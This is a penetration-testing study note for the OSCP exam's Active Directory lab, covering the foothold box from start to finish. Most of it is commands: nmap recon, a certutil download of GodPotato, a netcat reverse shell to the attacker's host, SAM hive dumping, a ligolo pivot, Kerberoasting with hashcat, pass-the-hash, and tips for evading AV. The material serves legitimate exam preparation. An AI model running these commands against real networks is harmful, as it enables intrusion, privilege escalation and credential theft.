# 🎯 MS01 — Exam Solve Guide (Foothold)

> How the **first AD box** actually goes on the OSCP AD set, distilled from real solves. Pattern: you're handed a low‑priv domain credential → land a shell on MS01 → local SYSTEM via token abuse → pivot inward → Kerberoast a service account to move laterally. Every value here is a placeholder — fill from your own run.

Part of [[Active Directory]] · [[AD Attack Framework]]. Next: [[MS02 — Exam Solve Guide (Lateral)|MS02]] → [[DC01 — Exam Solve Guide (Domain)|DC01]]. Overview: [[Exam AD Set — Solve Overview]].

```bash
export IP=<MS01_IP> DOMAIN=<domain.tld> U='<given_user>' P='<given_pass>'
echo "$IP MS01.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts ; sudo ntpdate $IP   # clock first
```

## 1. Recon — confirm the surface
```bash
sudo nmap -sC -sV -p- --min-rate 5000 $IP -oN nmap/ms01.txt
```
Typical finds: **22 SSH**, **445 SMB (signing not required)**, **5985/5986 WinRM**, **8000/8080/8443 web/IIS**. The given cred usually logs in over **SSH or WinRM**.

## 2. Access — log in with the provided domain cred
```bash
ssh $U@$IP                                  # OpenSSH-for-Windows is common
evil-winrm -i $IP -u $U -p "$P"             # if 5985/5986 and the user is Remote Mgmt
```
→ `whoami /all` to see groups + privileges.

## 3. PrivEsc — SeImpersonate → SYSTEM (the usual win)
```cmd
whoami /priv        :: look for SeImpersonatePrivilege = Enabled
certutil -urlcache -f http://<KALI>:<port>/GodPotato-NET4.exe GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe <KALI> 443 -e cmd.exe"
```
Catch on a listener → **SYSTEM**. ([[Token Privileges & Potato]]) If no SeImpersonate, fall back to [[Windows Privilege Escalation]] (services, AlwaysInstallElevated, stored creds).

## 4. Loot — dump local secrets
```cmd
reg save HKLM\SAM sam.hiv & reg save HKLM\SYSTEM system.hiv & reg save HKLM\SECURITY security.hiv
```
```bash
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```
Reuse any local user's hash/password against the other boxes ([[Credential Reuse]], [[Pass-the-Hash]]). **Also check:** PSReadLine history (`...\PSReadLine\ConsoleHost_history.txt`) and a `C:\windows.old\...\config\SAM` copy — both are recurring cred sources.

## 5. Pivot — reach the internal AD subnet
MS01 bridges the VPN to the internal network where the DC/MS02 live.
```bash
sudo ligolo-proxy -selfcert                 # kali
# on MS01: .\ligolo-agent.exe -connect <KALI>:11601 -ignore-cert   → add ip route to the internal /24
```
([[Ligolo-ng]] · [[Pivoting and Port Forwarding]])

## 6. AD enum + Kerberoast — earn the lateral cred
```bash
bloodhound-python -u $U -p "$P" -d $DOMAIN -ns <DC_IP> -c all --zip
sudo ntpdate <DC_IP>
impacket-GetUserSPNs "$DOMAIN/$U:$P" -dc-ip <DC_IP> -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```
A cracked **service-account** password (e.g. an `MSSQL/...` or `HTTP/...` SPN) is your ticket to MS02. ([[Kerberoasting]] → [[Hash Cracking]])

## ➡️ Handoff
Carry the cracked **service cred** + every local hash to [[MS02 — Exam Solve Guide (Lateral)]].

## 🧩 Real-world problems & fixes

### The given credential "doesn't work"
- **Try every form + protocol** before concluding it's wrong — a cred that fails one service often wins another:
```bash
nxc smb $IP -u "$U" -p "$P"            # also: winrm / rdp / mssql / ldap
nxc smb $IP -u "$U" -p "$P" --local-auth     # it may be a LOCAL account, not domain
# username forms: user · DOMAIN\user · user@domain.tld · .\user
```
- **Clock skew / name** (`KRB_AP_ERR_SKEW`, `PRINCIPAL_UNKNOWN`) → `sudo ntpdate $IP`, add FQDN to `/etc/hosts`, use the domain FQDN not the IP ([[Credentials Rejected]]).
- Still nothing → the cred may be for a **different box** in the set — hold it and reuse once you can reach the others.

### No `SeImpersonate` on the foothold box
- Run the full sweep: `powershell -ep bypass ". .\PowerUp.ps1; Invoke-AllChecks"` and `winPEAS` → unquoted service paths / weak service perms ([[Windows Service Exploits]]), **AlwaysInstallElevated** ([[AlwaysInstallElevated]]), stored creds (`cmdkey /list`, unattend, PS history → [[Windows Stored Credentials]]), `SeBackup`/`SeRestore` ([[Windows Special Privileges]]), scheduled tasks.
- Potato won't fire → wrong Potato for the build; **GodPotato** has the widest coverage; confirm the privilege is *Enabled*, not just present.

### Tooling blocked (AV even on the foothold box)
- GodPotato/`nc.exe` deleted on write → run from a user-writable dir, rename the binary, or use **PrintSpoofer** / **RunasCs** instead; worst case reverse-shell via a LOLBIN.

### Kerberoast/enum returns nothing
- `KRB_AP_ERR_SKEW` → `sudo ntpdate <DC>` first, use FQDN. `GetUserSPNs` empty → try `nxc ldap <DC> -u .. -p .. --kerberoasting out.txt`; **no SPN accounts at all** → fall back to [[AS-REP Roasting]], or local-privesc here for fresh creds.
- BloodHound collection fails (DNS/skew) → `-ns <DC>`, `/etc/hosts`, `ntpdate`.

### Can't reach the DC / internal hosts
- You haven't pivoted yet — the inner subnet is only reachable **through MS01**: stand up the ligolo route (or SSH `-D`), then `proxychains -q <tool> -sT -Pn` ([[Pivoting and Port Forwarding]] · [[Proxychains & SOCKS]]). Add internal names to `/etc/hosts`.

### A hash won't crack
- Don't — **pass it**. A local Administrator NT hash from MS01's SAM is frequently reused across the whole set ([[Pass-the-Hash]] · [[Credential Reuse]]).

## 🔑 Exam reminders
- **Clock sync + `/etc/hosts`** before any Kerberos step, or it fails cryptically.
- Given a domain user → **try it on SSH *and* WinRM** first; don't brute.
- `SeImpersonate` is the default foothold-box SYSTEM path — check `whoami /priv` immediately.
- Pivot early: MS02/DC are usually only reachable **through** MS01.
